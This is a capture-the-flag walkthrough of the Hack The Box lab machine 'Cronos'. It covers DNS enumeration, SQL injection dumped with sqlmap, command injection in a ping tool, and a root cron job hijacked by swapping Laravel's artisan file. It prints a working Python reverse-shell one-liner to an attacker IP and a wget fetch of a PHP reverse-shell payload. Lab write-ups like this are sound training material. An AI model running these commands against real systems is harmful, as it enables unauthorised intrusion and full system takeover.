---
description: https://app.hackthebox.com/machines/11
cover: ../../../.gitbook/assets/Cronos.png
coverY: -58.937823834196905
---

# Cronos

## Nmap

```
sudo nmap 10.10.10.13 -p- -sS -sV 

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Note:** Add `10.10.10.13 cronos.htb` to `/etc/hosts`. Also add 10.10.10.13 as an additional DNS server on the attacking system.

### DNS

To start we perform some basic enumeration on `DNS` against the target system. Using dnsenum we are able to enumerate the `admin.cronos.htb` sub domain which will be added to our hosts file.

```
dnsenum --dnsserver '10.10.10.13' --enum 'cronos.htb'
```

![](<../../../.gitbook/assets/image (21) (4).png>)

### Cronos.htb

Checkout out the root page for `http://cronos.htb` we are taken to `/index.php`. I was unable to pull any further interesting pages or directories from this website.

![](<../../../.gitbook/assets/image (12) (5).png>)

`Feroxbuster` turning up very few results...

![](<../../../.gitbook/assets/image (18) (1).png>)

### admin.cronos.htb

We know that the sub domain admin.cronos.htb exists and browse to it. We are presented with a logon page. Running ZAProxy in the background we are able to identify a `SQL` injection point on the login page as shown below.

![](<../../../.gitbook/assets/image (67).png>)

Details regarding the `SQL` injection point.

![](<../../../.gitbook/assets/image (1) (4) (1).png>)

### SQLmap

Using `SQLmap` we are able to pull relevant information.

```
sqlmap -u 'http://admin.cronos.htb/' --batch --forms --tables
```

After running the above command `SQLmap` identifies the database "admin". Using the command below we are able to dump discovered information from the "users" table.

```
sqlmap -u 'http://admin.cronos.htb/' --batch --forms -T users -D admin --dump 
```

![](<../../../.gitbook/assets/image (12) (1) (1).png>)

I was unable to crack the hash using the rockyou.txt wordlist. However, searhing online we find a clear text password for the related MD5 hash.

### Hash lookup

![](<../../../.gitbook/assets/image (23) (2) (1).png>)

### Net Tool v0.1

Using the credentials on the login page we are then presented with `Net Tool v0.1`.

![](<../../../.gitbook/assets/image (16) (2).png>)

Performing a `ping` request and capturing the POST request in `ZAProxy` we see where the command parameter is set.

![](<../../../.gitbook/assets/image (11) (2).png>)

A quick check with `cat` on `/etc/passwd` shows we are able to alter what command the target system executes.

![](<../../../.gitbook/assets/image (9) (3).png>)

Contents of `/etc/passwd`.

![](<../../../.gitbook/assets/image (127) (3).png>)

### Shell as www-data

From here we will build a Python reverse shell and run it in ZAProxy to obtain a reverse shell.

```
export RHOST="10.10.14.6";export RPORT=80;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

![](<../../../.gitbook/assets/image (126) (3).png>)

Which soon connects to our listener.

![](<../../../.gitbook/assets/image (118).png>)

### User.txt

We can then grab the user flag from `/home/noulis/user.txt`.

![](<../../../.gitbook/assets/image (125) (1).png>)

### Enumeration

Running `linpeas.sh` for enumeration we identify the cron job against Laravel artisan running every minute as the **root** user.

![](<../../../.gitbook/assets/image (120).png>)

Browsing to `/var/www/laravel` we see we have full permissions as www-data over the artisan file.

![](<../../../.gitbook/assets/image (124).png>)

### Privilege Escalation

Given the full permissions we can create a `PHP` reverse shell on our attacking system. Name it artisan and transfer over to the target system. RevShells was utilized to create the PHP monkey reverse shell.

**RevShells:** [https://www.revshells.com/](https://www.revshells.com/)

![](<../../../.gitbook/assets/image (117).png>)

Remove the current artisan file and upload the reverse shell file.

```
rm artisan
wget http://10.10.14.6:8000/artisan
```

![](<../../../.gitbook/assets/image (121) (3).png>)

### Shell as root

After the file has been uploaded. Start a `netcat` listener and wait a minute or two for it to trigger a reverse shell.

![](<../../../.gitbook/assets/image (119).png>)
